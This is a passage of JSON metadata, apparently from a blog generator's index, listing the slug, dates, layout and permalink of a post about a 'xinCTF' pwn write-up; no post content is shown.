wp","date":"2022-04-19T03:19:30.000Z","slug":"xinCTF-pwn-wp","published":true,"updated":"2025-10-28T08:00:40.778Z","_id":"cuidlz8-dalYlI7aIWW_4taBD","layout":"post","photos":[],"excerpt":"","path":"/p/xinCTF-pwn-wp/","permalink":"https://blog.csome.cc/p/xinCTF-pwn-wp/","__post":true},"__post":true}